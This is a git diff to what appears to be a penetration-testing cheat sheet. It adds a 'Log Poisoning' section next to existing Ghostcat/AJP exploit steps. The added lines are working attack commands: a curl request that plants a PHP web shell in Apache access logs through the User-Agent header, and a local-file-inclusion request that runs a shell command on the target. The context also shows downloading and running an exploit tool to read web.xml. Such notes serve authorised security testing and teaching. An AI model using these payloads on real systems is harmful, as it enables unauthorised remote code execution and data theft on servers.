@@ -18,6 +18,7 @@
 * [Port Tunnelling](#Port-Tunnelling)
 * [WEB Fuzz](#WEB-Fuzz)
 * [Jserv](#Jserv)
+* [Log Poisoning](#Log-Poisoning)
 
 ## Protocols
 
@@ -374,6 +375,18 @@ wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/
 
 # Run ajpShooter
 python3 ajpShooter.py http://{TARGET} {PORT} /WEB-INF/web.xml read
+```
+
+# Log Poisoning
+
+Apache log poisoning using User-Agent.  
+This will make possible a RCE through LFI by reading apache logs.
+```
+# Poisoning
+curl http://{TARGET} -A "<?php system(\$_GET['cmd']);?>"
+
+# LFI to run the command id passed in 'cmd' parameter
+$ curl http://{TARGET}/lfi.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
 
